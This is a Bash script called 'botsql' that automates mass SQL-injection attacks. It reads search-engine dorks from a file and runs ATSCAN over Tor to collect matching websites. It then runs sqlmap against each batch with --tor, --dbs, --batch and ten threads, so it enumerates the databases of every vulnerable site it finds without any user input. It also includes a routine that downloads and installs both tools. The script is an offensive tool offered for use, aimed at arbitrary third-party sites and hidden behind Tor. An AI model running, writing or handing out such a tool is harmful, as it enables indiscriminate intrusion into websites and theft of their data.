#!/bin/bash
# coded by github.com/thelinuxchoice/botsql
# instagram: @thelinuxchoice


checktor() {

check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mPlease, check your TOR Connection! Just type tor or service tor start\n\e[0m"
exit 1
fi

}
scan() {
checktor
read -p $'\e[1;92mAtscan directory (e.g. /tools/ATSCAN): \e[0m' pathatscan
read -p $'\e[1;92mSqlmap directory (e.g /tools/sqlmap): \e[0m' pathsqlmap
default_dork="dorks.txt"
read -p $'\e[1;92mDorks file (Hit Enter to default list): \e[0m' dork
dork="${dork:-${default_dork}}"

count=0

while read line
do
torsocks perl $pathatscan/atscan.pl --dork "$line" --level 100 -m 1,2 -s "links $count.txt" &&
python $pathsqlmap/sqlmap.py -m "links $count.txt" --tor --check-tor --dbs --smart --threads=10 --output-dir=output --batch
let count++
done < $dork
}

download() {
default_dlsql="Y"
printf "\n\e[1;92m [?] Download sqlmap \e[0m"
read -p $'\e[1;92m? [Y/n]: \e[0m' dlsql
dlsql="${dlsql:-${default_dlsql}}"
if [[ "$dlsql" == "Y" || "$dlsql" == "y" || "$dlsql" == "yes" || "$dlsql" == "Yes" ]]; then
git clone https://github.com/sqlmapproject/sqlmap

fi

default_ats="Y"
printf "\n\e[1;92m [?] Download Atscan \e[0m"
read -p $'\e[1;92m? [Y/n]: \e[0m' ats
ats="${ats:-${default_ats}}"
if [[ "$ats" == "Y" || "$ats" == "y" || "$ats" == "yes" || "$ats" == "Yes" ]]; then
git clone https://github.com/AlisamTechnology/ATSCAN
fi
default_atsdep="Y" 
printf "\n\e[1;92m [?] Download Atscan dependencies \e[0m"
read -p $'\e[1;92m? [Y/n]: \e[0m' atsdep
atsdep="${atsdep:-${default_atsdep}}"

if [[ "$atsdep" == "Y" || "$atsdep" == "y" || "$atsdep" == "yes" || "$atsdep" == "Yes" ]]; then

printf "\e[1;92m[*] Installing Atscan dependencies...\n \e[0m" 
sleep 2;
perl -MCPAN -e 'my $c = "CPAN::HandleConfig"; $c->load(doit => 1, autoconfig => 1); $c->edit(prerequisites_policy => "follow"); $c->edit(build_requires_install_policy => "yes"); $c->commit'; 
cpan install App:cpanminus; cpanm URI::Escape HTML::Entities HTTP::Request LWP::UserAgent;
fi

}

case "$1" in --download) download ;; --start) scan ;; *)
printf "\e[1;92m[*] Usage: ./botsql.sh --start --download \e[0m\n"
esac
